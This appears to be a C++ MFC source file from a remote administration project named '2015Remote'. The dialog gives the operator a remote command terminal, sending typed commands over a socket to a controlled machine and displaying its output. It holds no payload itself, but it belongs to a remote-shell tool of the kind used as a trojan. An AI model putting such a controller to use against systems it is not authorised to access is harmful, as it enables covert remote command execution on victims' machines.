// ShellDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "ShellDlg.h"
#include "afxdialogex.h"


// CShellDlg 对话框

IMPLEMENT_DYNAMIC(CShellDlg, CDialog)

CShellDlg::CShellDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: CDialog(CShellDlg::IDD, pParent)
{
	m_iocpServer	= IOCPServer;
	m_ContextObject		= ContextObject;

	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_SHELL)); 
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT, m_Edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CShellDlg 消息处理程序


BOOL CShellDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	m_nCurSel = 0;
	m_nReceiveLength = 0;
	SetIcon(m_hIcon,FALSE);

	CString str;
	sockaddr_in  ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int ClientAddrLen = sizeof(ClientAddr);
	BOOL bResult = getpeername(m_ContextObject->sClientSocket, (SOCKADDR*)&ClientAddr, &ClientAddrLen);

	str.Format("%s - 远程终端", bResult != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "");
	SetWindowText(str);

	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));  

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


VOID CShellDlg::OnReceiveComplete()
{
	if (m_ContextObject==NULL)
	{
		return;
	}

	AddKeyBoardData();
	m_nReceiveLength = m_Edit.GetWindowTextLength();
}


VOID CShellDlg::AddKeyBoardData(void)
{
	// 最后填上0

	//Hello>dir
	//Shit\0
	m_ContextObject->InDeCompressedBuffer.WriteBuffer((LPBYTE)"", 1);           //从被控制端来的数据我们要加上一个\0
	CString strResult = (char*)m_ContextObject->InDeCompressedBuffer.GetBuffer(0);    //获得所有的数据 包括 \0

	//替换掉原来的换行符  可能cmd 的换行同w32下的编辑控件的换行符不一致   所有的回车换行   
	strResult.Replace("\n", "\r\n");

	//得到当前窗口的字符个数
	int	iLength = m_Edit.GetWindowTextLength();    //kdfjdjfdir
	//hello                                    
	//1.txt
	//2.txt
	//dir\r\n

	//将光标定位到该位置并选中指定个数的字符  也就是末尾 因为从被控端来的数据 要显示在 我们的 先前内容的后面
	m_Edit.SetSel(iLength, iLength);

	//用传递过来的数据替换掉该位置的字符    //显示
	m_Edit.ReplaceSel(strResult);   

	//重新得到字符的大小

	m_nCurSel = m_Edit.GetWindowTextLength();   //Hello 

	//我们注意到，我们在使用远程终端时 ，发送的每一个命令行 都有一个换行符  就是一个回车
	//要找到这个回车的处理我们就要到PreTranslateMessage函数的定义  
}

void CShellDlg::OnClose()
{
#if CLOSE_DELETE_DLG
	m_ContextObject->v1 = 0;
#endif
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);

	CDialog::OnClose();
#if CLOSE_DELETE_DLG
	delete this;
#endif
}


BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;
		//如果是可编辑框的回车键
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_Edit.m_hWnd)
		{
			//得到窗口的数据大小
			int	iLength = m_Edit.GetWindowTextLength();
			CString str;
			//得到窗口的字符数据
			m_Edit.GetWindowText(str);
			//加入换行符
			str += "\r\n";
			//得到整个的缓冲区的首地址再加上原有的字符的位置，其实就是用户当前输入的数据了
			//然后将数据发送出去
			LPBYTE pSrc = (LPBYTE)str.GetBuffer(0) + m_nCurSel;
#ifdef _DEBUG
			OutputDebugStringA("[Shell]=> ");
			OutputDebugStringA((char*)pSrc);
#endif
			int length = str.GetLength() - m_nCurSel;
			m_iocpServer->OnClientPreSending(m_ContextObject, pSrc, length);
			m_nCurSel = m_Edit.GetWindowTextLength();
			if (0 == strcmp((char*)pSrc, "exit\r\n"))
			{
				ShowWindow(SW_HIDE);
			}
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_Edit.m_hWnd)
		{
			if (m_Edit.GetWindowTextLength() <= m_nReceiveLength)  
				return true;
		}
		// 示例：
		//dir\r\n  5
		//hello\r\n 7
	}

	return CDialog::PreTranslateMessage(pMsg);
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
	return hbr;
}
